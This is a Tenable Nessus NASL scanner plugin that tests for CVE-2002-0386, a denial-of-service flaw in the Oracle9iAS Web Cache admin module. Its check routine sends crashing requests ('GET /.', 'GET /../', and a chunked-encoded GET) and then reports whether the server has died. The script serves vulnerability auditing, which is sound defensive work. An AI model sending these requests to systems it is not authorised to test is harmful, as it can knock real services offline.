#
# (C) Tenable Network Security, Inc.
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# Date:  Thu, 18 Oct 2001 16:16:20 +0200
# From: "andreas junestam" <andreas.junestam@defcom.com>
# Affiliation: Defcom
# To: "bugtraq" <bugtraq@securityfocus.com>
# Subject: def-2001-30
#
# From: "@stake advisories" <advisories@atstake.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 28 Oct 2002 13:30:54 -0500
# Subject: Oracle9iAS Web Cache Denial of Service (a102802-1)
#
# http://www.atstake.com/research/advisories/2002/a102802-1.txt
# http://otn.oracle.com/deploy/security/pdf/2002alert43rev1.pdf
#
# Affected:
# Oracle9iAS Web Cache/2.0.0.1.0
# 



include("compat.inc");

if(description)
{
 script_id(11076);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-2002-0386");
 script_bugtraq_id(3765, 5902);
 script_osvdb_id(9464);

 script_name(english:"Oracle Web Cache Admin Module Multiple GET Request Method DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server appears to be affected by a denial of
service condition." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by requesting '/.' or 
'/../', or sending an invalid request using chunked content 
encoding. An attacker may exploit this vulnerability to crash
the web server." );
 script_set_attribute(attribute:"see_also", value:"http://www.oracle.com/technology/deploy/security/pdf/2002alert43rev1.pdf" );
 script_set_attribute(attribute:"solution", value:
"upgrade your software or protect it with a filtering reverse proxy" );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/10/04");
 script_cvs_date("$Date: 2014/07/11 18:33:06 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:application_server");
 script_end_attributes();

 
 script_summary(english:"Invalid web requests crash Oracle webcache admin");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_require_ports("Services/www", 4000);
 script_dependencie("find_service1.nasl", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(port)
{
  local_var	w;
  local_var 	banner;

 if (http_is_dead(port: port)) return;
 banner = get_http_banner(port:port);
 if ( ! banner || "OracleAS-Web-Cache" >!< banner ) return;

 # The advisory says "GET /. HTTP/1.0" - however this won't get
 # past some transparent proxies, so it's better to use http_get()
 
 w = http_send_recv3(method:"GET",port: port, item: "/.");
 w = http_send_recv3(method:"GET", port: port, item: "/../");
 w = http_send_recv3(method:"GET", port: port, item: "/", 
   add_headers: make_array("Transfer-Encoding", "chunked"));
 sleep(1); # Is it really necessary ?
 if(http_is_dead(port:port))security_warning(port);
 return;
}

ports = add_port_in_list(list:get_kb_list("Services/www"), port:4000);
foreach port (ports) check(port: port);

